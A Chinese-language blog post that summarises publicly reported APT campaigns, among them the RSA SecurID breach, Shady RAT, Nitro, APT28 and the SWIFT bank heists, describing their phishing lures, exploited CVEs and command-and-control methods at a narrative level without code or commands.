<p>2011年3月，EMC公司下属的RSA公司遭受入侵，部分<span style="color:#CC0000;">SecurID</span>技术及客户资料被窃取。其后果导致很多使用SecurID作为认证凭据建立VPN网络的公司——包括洛克希德马丁公司、诺斯罗普公司等美国国防外包商——受到攻击，重要资料被窃取。在RSA SecurID攻击事件中，攻击方没有使用大规模SQL注入，也没有使用网站挂马或钓鱼网站，而是以最原始的网路通讯方式，直接寄送电子邮件给特定人士，并附带防毒软体无法识别的恶意文件附件。</p>
<p><img src="https://uzshare.com/_p?https://img-blog.csdn.net/20170808003031204?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvWm1laVh1YW4=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt=""></p>
<p style="text-align:center;"></p>
<h4>其攻击过程大体如下：</h4>
<p>1) RSA有两组同仁们在两天之中分别收到标题为“2011 Recruitment Plan”的恶意邮件，附件是名为“2011 Recruitment plan.xls”的电子表格;</p>
<p>2) 很不幸，其中一位同仁对此邮件感到兴趣，并将其从垃圾邮件中取出来阅读，殊不知此电子表格其实含有当时最新的Adobe Flash的0day漏洞(CVE-2011-0609);</p>
<p>3) 该主机被植入臭名昭著的Poison Ivy远端控制工具，并开始自C&amp;C中继站下载指令进行任务;</p>
<p>4) 首批受害的使用者并非“位高权重”人物，紧接着相关联的人士包括IT与非IT等服务器管理员相继被黑;</p>
<p>5) RSA发现开发用服务器(Staging server)遭入侵，攻击方随即进行撤离，加密并压缩所有资料(都是rar格式)，并以FTP传送至远端主机，又迅速再次搬离该主机，清除任何踪迹。</p>
<h2><a href="http://blog.sina.com.cn/s/blog_a0325c960101et2e.html" rel="nofollow" data-token="3b619d9a20f3a779899d9266b150ed04"><strong>暗鼠攻击</strong></a></h2>
<p>2011年8月份，McAfee/Symantec发现并报告了该攻击。该攻击在长达数年的持续攻击过程中，渗透并攻击了全球多达70个公司和组织的网络，包括美国政府、联合国、红十字会、武器制造商、能源公司、金融公司，等等。</p>
<p style="text-align:center;"></p>
<h4>其攻击过程如下：</h4>
<p>1) 攻击者通过社会工程学的方法收集被攻击目标的信息。</p>
<p>2) 攻击者给目标公司的某个特定人发送一些极具诱惑性的、带有附件的邮件例如邀请他参见某个他所在行业的会议，以他同事或者HR部门的名义告知他更新通讯录，请他审阅某个真实存在的项目的预算，等等。</p>
<p>3) 当受害人打开这些邮件，查看附件(大部分形如：Participant_Contacts.xls、2011 project budget.xls、Contact List -Update.xls、The budget justification.xls)，受害人的EXCEL程序的FEATHEADER远程代码执行漏洞(Bloodhound.Exploit.306)被利用，从而被植入木马。实际上，该漏洞不是0day漏洞，但是受害人没有及时打补丁，并且，该漏洞只针对某些版本的EXCEL有效，可见被害人所使用的EXCEL版本信息也已经为攻击者所悉知。</p>
<p>4) 木马开始跟远程的服务器进行连接，并下载恶意代码。而这些恶意代码被精心伪装(例如被伪装为图片，或者HTML文件)，不为安全设备所识别。</p>
<p>5) 借助恶意代码，受害人机器与远程计算机建立了远程Shell连接，从而导致攻击者可以任意控制受害人的机器。</p>
<p>&nbsp;</p>
<h2><strong>Lurid攻击</strong></h2>
<p>2011年9月22日，TrendMicro的研究人员公布了一起针对前独联体国家、印度、越南和中国等国家的政府部门、外交部门、航天部门，还有科研机构APT攻击——Lurid攻击。</p>
<p style="text-align:center;"></p>
<p>攻击者的主要是利用了<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4324" rel="nofollow" data-token="d443d00ec323258f6682a483cee3ca52">CVE-2009-4324</a>和<a href="https://bbs.ichunqiu.com/thread-9720-1-1.html" rel="nofollow" data-token="0dbd01ae12a1b90a5bcfd8beb86068d6"> CVE-2010-2883</a>这两个已知的Adobe Reader漏洞，以及被压缩成RAR文件的带有恶意代码的屏幕保护程序。</p>
<p>用户一旦阅读了恶意PDF文件或者打开了恶意屏幕保护程序，就会被植入木马。木马程序会变换多种花样驻留在受害人电脑中，并与C&amp;C服务器进行通讯，收集的信息通常通过HTTP POST上传给C&amp;C服务器。攻击者借助C&amp;C服务器对木马下达各种指令，不断收集受害企业的敏感信息。</p>
<p>&nbsp;</p>
<h2><strong>Nitro攻击</strong></h2>
<p>2011年10月底，Symantec发布的一份报告公开了主要针对全球化工企业的进行信息窃取的Nitro攻击。</p>
<p style="text-align:center;"><a href="http://s7.51cto.com/wyfs01/M01/16/C3/wKioJlIckDOR2IsTAANyKYyZWeo847.jpg" rel="nofollow" data-token="2bc909f821d284141b826fd8ead1baa7"><img class="fit-image" src="http://s7.51cto.com/wyfs01/M01/16/C3/wKioJlIckDOR2IsTAANyKYyZWeo847.jpg" alt="APT攻击之Nitro攻击" width="353" height="244" border="0"></a></p>
<h4>该攻击的过程也十分典型：</h4>
<p>1) 受害企业的部分雇员收到带有欺骗性的邮件;</p>
<p>2) 当受害人阅读邮件的时候，往往会看到一个通过文件名和图标伪装成一个类似文本文件的附件，而实际上是一个可执行程序;或者看到一个有密码保护的压缩文件附件，密码在邮件中注明，并且如果解压会产生一个可执行程序。</p>
<p>3) 只要受害人执行了附件中的可执行程序，就会被植入<span style="color:#CC0000;">Poison Ivy</span>后门程序。</p>
<p>4) Poison Ivy会通过TCP 80端口与C&amp;C服务器进行加密通讯，将受害人的电脑上的信息上传，主要是帐号相关的文件信息。</p>
<p>5) 攻击者在获取了加密的帐号信息后通过解密工具找到帐号的密码，然后借助事先植入的木马在受害企业的网络寻找目标、伺机行动、不断收集企业的敏感信息。</p>
<p>6) 所有的敏感信息会加密存储在网络中的一台临时服务器上，并最终上传到公司外部的某个服务器上，从而完成攻击。</p>
<p>&nbsp;</p>
<h2><strong>Luckycat攻击</strong></h2>
<p>2012年3月份，TrendMicro发布的报告中披露了一个针对印度和日本的航空航天、军队、能源等单位进行长时间的渗透和刺探的攻击行动，并命名为Luckycat。</p>
<p>根据报告显示，这次攻击行动依然是通过钓鱼邮件开始的，例如针对日本目标的钓鱼邮件的内容大都跟福岛核电站的核辐射问题有关。然后就是利用了很多针对 pdf/rtf的漏洞，包括CVE-2010-3333，CVE-2010-2883，CVE-2010-3654，CVE- 2011-0611，CVE-2011-2462等。渗透进去之后就是用C&amp;C进行远程控制。而C&amp;C服务器是通过VPS申请到的DNS域名。</p>
<p></p>
<h2><a href="http://jaq.alibaba.com/community/art/show?articleid=724" rel="nofollow" title="全球最危险的十大APT攻击事件" data-token="760cb95a8fdaa96cb9b7e64ba28e456a">全球最危险的十大APT攻击事件</a></h2>
</p></div>
<p>  <span style="font-size:18px;line-height:2;"><strong>一、 丰收行动</strong></span> </p>
<p><span style="font-size:14px;line-height:2;">2016年7月，东巽科技2046Lab捕获到一例疑似木马的样本，该木马样本伪装成Word文档，实为包含CVE-2015-1641（Word类型混淆漏洞）漏洞利用的RTF格式文档，以邮件附件的形式发给攻击目标，发动鱼叉式攻击。将文件提交到多引擎杀毒平台，发现54款杀毒软件仅8款可以检出威胁，说明攻击者对木马做了大量的免杀处理。随后，2046Lab研究人员对样本进行了深入的人工分析，发现其C&amp;C服务器依然存活，于是对其进行了跟踪溯源和样本同源分析，又发现了其他两处C&amp;C服务器和更多样本。</span></p>
<p><span style="font-size:14px;line-height:2;"><br /></span></p>
<p><span style="font-size:14px;line-height:2;">从溯源和关联分析来看，种种迹象表明，该样本源于南亚某国隐匿组织的APT攻击，目标以巴基斯坦、中国等国家的科研院所、军事院校和外交官员为主，通过窃取文件的方式获取与军事相关情报。由于样本的通信密码含有“January14”关键词，这一天正好是南亚某国盛行的“丰收节”，故把该APT事件命名为“丰收行动”。</span></p>
<p style="text-align:center;"><img src="http://www.4hou.com/uploads/20170112/1484194537670408.png" alt="1.png"></p>
<p style="text-align:center;"></p>
<h2><span style="font-size:18px;line-height:2;"><strong>二、 摩诃草事件</strong></span> </h2>
<p><span style="font-size:14px;line-height:2;">摩诃草组织（APT-C-09），又称 HangOver、VICEROY TIGER、The Dropping Elephant、Patchwork，是一个来自于南亚地区的境外 APT 组织，该组织已持续活跃了 7 年。摩诃草组织最早由 Norman 安全公司于 2013 年曝光，随后又有其他安全厂商持续追踪并披露该组织的最新活动，但该组织并未由于相关攻击行动曝光而停止对相关目标的攻击，相反从 2015年开始更加活跃。摩诃草组织主要针对中国、巴基斯坦等亚洲地区国家进行网络间谍活动，其中以窃取敏感信息为主。相关攻击活动最早可以追溯到 2009 年 11 月，至今还非常活跃。在针对中国地区的攻击中，该组织主要针对政府机构、科研教育领域进行攻击，其中以科研教育领域为主。</span> </p>
<p><span style="font-size:14px;line-height:2;"><br /></span></p>
<p><span style="font-size:14px;line-height:2;">本次攻击行动也安全厂商被称为“Patchwork”或“The Dropping Elephant”，从 2015 年初开始持续至今的攻击，其中从 2015 年 8 月开始至 2016 年 6 月攻击 非常频繁。本次行动的攻击目标主要是中国地区，期间使用了大量文档型漏洞，以 CVE-2014-4114 使用最多。我们主要通过本次攻击行动中 C&amp;C 的 SOA 关联到第一次攻击行动 中相关 C&amp;C 历史域名注册人，由于 SOA 本身可以被 DNS 管理者修改，所以存在被刻意修改 的可能性，但从我们的分析推断来看这种可能性很低，另外结合相关行动意图和幕后组织的 发起方，我们更倾向本次攻击行动属于摩诃草组织的最新一次攻击行动。在本报告后续章节 的研究分析，会将本次攻击行动作为摩诃草组织的第四次攻击行动进行描述。</span></p>
<p><span style="font-size:14px;line-height:2;"><br /></span></p>
<p style="text-align:center;"><img src="http://www.4hou.com/uploads/20170112/1484194567761106.png" alt="11.png"></p>
<p style="text-align:center;"></p>
<h2><span style="font-size:18px;line-height:2;"><strong>三、 蔓灵花行动</strong></span> </h2>
<p><span style="font-size:14px;line-height:2;">美国网络安全公司Forcepoint 近期发布了一篇报告，该报告主要披露了巴基斯坦政府官员最近遭到了来源不明的网络间谍活动。该报告描述了攻击者使用了鱼叉邮件以及利用系统漏洞等方式，在受害者计算机中植入了定制的AndroRAT，意图窃取敏感信息和资料。Forcepoint研究人员认为该组织与BITTER相关，而且可能还不止发起了这一起攻击事件。BITTER攻击始于2013年11月，且多年来一直未被检测到，目前攻击者背景尚未明确。相关APP信息包括提供关于印度和巴基斯坦之间的争议地区新闻的Kashmir News等。</span> </p>
<p><span style="font-size:14px;line-height:2;"><br /></span></p>
<p><span style="font-size:14px;line-height:2;">从恶意样本的时间戳来看，国外样本最早出现在2013年11月，样本编译时间集中出现在2015年7月至2016年9月期间。</span></p>
<p><span style="font-size:14px;line-height:2;">国内感染用户的样本的编译时间集中在2016年5月到9月期间，其网络活动的活跃时间集中在9月份，其CC至今依然存活。</span></p>
<p><span style="font-size:14px;line-height:2;">主要受影响单位：中国某国家部委、中国某工业集团、中国某电力单位。</span></p>
<p><span style="font-size:14px;line-height:2;"><br /></span></p>
<p style="text-align:center;"><img src="http://www.4hou.com/uploads/20170112/1484194621700486.png" alt="1484194621700486.png" width="680" height="358" border="0" style="width:680px;"></p>
<p></p>
<h2><span style="font-size:18px;line-height:2;"><strong>四、 MONSOON事件</strong></span></h2>
<p><span style="font-size:14px;line-height:2;">2016年8月，Forcepoint 发布了一个APT攻击的追踪报告。该报告由Forcepoint安全实验室特别调查小组长期独立追踪完成。该调查小组隶属于Forcepoint安全实验室，由优秀的恶意软件逆向工程师和分析师组成，其职责是专门深入研究僵尸网络和APT攻击。他们与全球众多值得信赖的机构协作，以提供切实可见的决策为宗旨，向大众、客户以及合作伙伴等利益相关者传递相关信息，针对网络安全问题，警醒全球用户。此次APT事件来自印度的针对中国和南亚国家。</span></p>
<p><span style="font-size:14px;line-height:2;"><br /></span></p>
<p style="text-align:center;"><img src="http://www.4hou.com/uploads/20170112/1484194665218746.png" alt="1111.png"></p>
<h2><span style="font-size:18px;line-height:2;"><strong>六、白俄罗斯军事通讯社事件</strong></span></h2>
<p><span style="font-size:14px;line-height:2;">最近，互联网上出现一起针对白俄罗斯军事网站的渗透活动，攻击者通过电子邮件做为诱饵，在电子邮件的附件中嵌入漏洞利用的文档，在受害者打开文档后，文档中嵌入的shellcode得以执行，实现对目标系统的控制。在受害者重启计算机后，通过操作系统的启动项加载PE文件，进行后续的渗透攻击。从我们最初得到的email来看，攻击者针对是白俄罗斯共和国国防部武装部队军事通讯社进行的定向攻击。</span></p>
<p><span style="font-size:14px;line-height:2;">攻击者第一步是向白俄罗斯共和国国防部武装部队军事通讯社发送邮件。邮件主题“Куда идёт Беларусь”翻译成中文是”白俄罗斯将何去何从？”</span></p>
<p><span style="font-size:14px;line-height:2;"><br /></span></p>
<p style="text-align:center;"><img src="http://www.4hou.com/uploads/20170112/1484194696302002.png" alt="1484194696302002.png" width="550" height="614" border="0" style="width:550px;"></p>
<p style="text-align:center;"></p>
<h2><span style="font-size:18px;line-height:2;"><strong>七、APT28 Roskosmos事件</strong></span></h2>
<p><span style="font-size:14px;line-height:2;">2016年6月在DNC电脑系统中曾发现APT28的渗透痕迹，其实早在过去，网络安全公司火眼曾把APT28与2007年检测到的一起攻击联系起来，该起攻击的目标是格鲁吉亚、波兰、匈牙利、土耳其和波罗的海各国，以及欧洲安全合作组织(OSCE)。而现在更有研究指出该组织一直将注意力转移到世界反兴奋剂(WADA)等西方政府或军事机构，而这次他们使用了新型木马Komplex来感染苹果系统设备。</span></p>
<p><span style="font-size:14px;line-height:2;"><br /></span></p>
<p><span style="font-size:14px;line-height:2;">在过去一些分析中认为APT28主要依赖3种不同的攻击途径来感染他们的目标：用恶意Word和Excel文档作为附件的钓鱼邮件，钓鱼网站，会导致Java和Flash 0-day漏洞的恶意iFrame代码。在过去的两年中出现了许多活跃的黑客组织，比如APT28、Sofacy、Pawn Storms、Fancy Bear以及Sednit等。</span></p>
<p><span style="font-size:14px;line-height:2;"><br /></span></p>
<p><span style="font-size:14px;line-height:2;">而在近期美国民主党委员会遭到网络攻击一事中，英国伦敦国王学院的教授Thomas Rid曾就此事件写了一篇最权威的文章，列出所有迹象和证据表明俄罗斯政府就是DNC网络攻击背后的黑手，而后经过调查，美国安全公司CrowdStrike已经确认，第一起攻击其网络的时间为2015年，第二个黑客组织于2016年发起攻击，而在这种就发现该组织痕迹。然而恶意软件Komplex是如何快速感染目标用户？其实方法也不是很复杂，主要是通过钓鱼邮件的方式，引诱不知情的用户感染木马病毒，伪装的信息一般是俄罗斯即将推出的太空计划或最新项目，而这些会有多少人不感兴趣，于是感染的用户越来越多。</span></p>
<p><span style="font-size:14px;line-height:2;"><br /></span></p>
<p style="text-align:center;"><img src="http://www.4hou.com/uploads/20170112/1484194740299249.png" alt="1484194740299249.png" width="600" height="475" border="0" style="width:600px;"></p>
<p style="text-align:center;"></p>
<h2><span style="font-size:18px;line-height:2;"><strong>八、Patchwork 事件</strong></span></h2>
<p><span style="font-size:14px;line-height:2;">最近，一个与东南亚和中国南海问题相关的APT攻击被发现，该APT攻击以包括美国在内的各国政府和公司为目标 。经安全专家分析，该APT攻击所使用的全部工具代码都是通过 复制-粘贴 互联网公开代码组合而成，相对于其它APT特有的攻击工具而言，比较独特。</span></p>
<p><span style="font-size:14px;line-height:2;">该APT攻击于今年5月在针对欧洲政府部门的一起钓鱼活动中被发现，攻击目标为一个中国政策研究机构的工作人员，其以PPT文档为诱饵发起网络攻击，文档内容为中国在南海的一系列活动。</span></p>
<p><span style="font-size:14px;line-height:2;">Patchwork现如今的攻击目标有了极大范围的扩展，不过主要还是针对公共部门和企业。近期Patchwork的一些攻击针对的行业包括：航空、广播、能源、金融、非政府组织、制药、公有企业、出版、软件。</span></p>
<p><span style="font-size:14px;line-height:2;">攻击目标的地理位置则也扩展到了美国之外，虽然大约有半数攻击仍然针对美国，但其余攻击针对的国家地区则相对已经比较分散了，包括中国、日本、东南亚、英国等。而其攻击方式看来并没有太大变化，仍然是向目标发出时事新闻邮件。邮件中会包含攻击者的网站链接，这些网站的内容主要都是中国相关。</span></p>
<p><span style="font-size:14px;line-height:2;"><br /></span></p>
<p style="text-align:center;"><img src="http://www.4hou.com/uploads/20170112/1484194776147472.png" alt="222.png"></p>
<p></p>
<h2><span style="font-size:18px;line-height:2;"><strong>九、BlackEnergy</strong></span></h2>
<p><span style="font-size:14px;line-height:2;">去年年底的时候，一波网络攻击的其中几个部分经鉴定是针对乌克兰的。而对这些攻击比较广泛的说法是，此次攻击是著名的BlackEnergy木马并且增加了一些新的模块。</span></p>
<p><span style="font-size:14px;line-height:2;">BlackEnergy木马是著名的黑客Cr4sh创造的。在2007年，他声称不再开发这款木马，并且卖出木马的源码，估价在$700。刚开始，在2008年它被一些黑客们用来针对格鲁吉亚进行DDOS攻击。这些不知名的黑客在随后的几年里持续进行DDOS攻击。</span></p>
<p><span style="font-size:14px;line-height:2;"><br /></span></p>
<p><span style="font-size:14px;line-height:2;">大概在2014年，一个特别的BlackEnergy组织开始引起大家的注意，他们开发了监测控制和数据采集类的插件来威胁ICS并且在全世界范围都非常活跃。这显示出BlackEnergy还存在的一些特别的能力，不仅仅局限于DDOS攻击。因此，我们称他们为BlackEnergy APT组织。</span></p>
<p><span style="font-size:14px;line-height:2;">这些组织的其中的一个APT攻击的目标就是乌克兰。自从2015年中期开始，乌克兰就开始存在通过Excel宏病毒进行BlackEnergy攻击，如果用户打开此类文档脚本就会释放木马至本地硬盘。</span></p>
<p><span style="font-size:14px;line-height:2;">最近，我们发现了一种新型的针对乌克兰的BlackEnergy APT文档类攻击。不像以前采用Excel工作簿进行攻击，此次采用的是Word文档。该文档通过提及乌克兰“Right Sector”反对派政府来达到迷惑的效果。</span></p>
<p><span style="font-size:14px;line-height:2;"><br /></span></p>
<p style="text-align:center;"><img src="http://www.4hou.com/uploads/20170112/1484194805389526.png" alt="1484194805389526.png" width="600" height="473" border="0" style="width:600px;"></p>
<p></p>
<h2><span style="font-size:18px;line-height:2;"><strong>十、SWIFT系统攻击事件</strong></span></h2>
<p><span style="font-size:14px;line-height:2;">2016年2月孟加拉国央行被黑客攻击导致8100万美元被窃取的事件被曝光后，如越南先锋银行、厄瓜多尔银行等，针对银行SWIFT系统的其他网络攻击事件逐一被公开。</span></p>
<p><span style="font-size:14px;line-height:2;">在分析孟加拉国央行和越南先锋银行攻击事件期间，我们发现近期曝光的这4起针对银行的攻击事件并非孤立的，而很有可能是由一个组织或多个组织协同发动的不同攻击行动。</span></p>
<p><span style="font-size:14px;line-height:2;">另外通过对恶意代码同源性分析，我们可以确定本次针对孟加拉国央行和越南先锋银行的相关恶意代码与Lazarus组织（APT-C-26）有关联，但我们不确定幕后的攻击组织是Lazarus组织（APT-C-26）。</span></p>
<p><span style="font-size:14px;line-height:2;"><br /></span></p>
<p style="text-align:center;"><img src="http://www.4hou.com/uploads/20170112/1484194845931224.png" alt="3.png"></p>
<p style="text-align:center;"></p>
<p></p>
<p><span style="color:#CC0000;"><strong>该部分来源于：&gt;</strong><br /></span></p>
<h2><span style="font-size:18px;line-height:2;"><strong>阿里聚安全</strong></span> </h2>
<p>  <span style="font-size:14px;line-height:2;">阿里聚安全（http://jaq.alibaba.com）由阿里巴巴安全部出品，面向企业和开发者提供互联网业务安全解决方案，全面覆盖移动安全、数据风控、内容安全等维度，并在业界率先提出“以业务为中心的安全”，赋能生态，与行业共享阿里巴巴集团多年沉淀的专业安全能力。</span>
 </div>
</div>
]]></content:encoded>
										</item>
	</channel>
</rss>
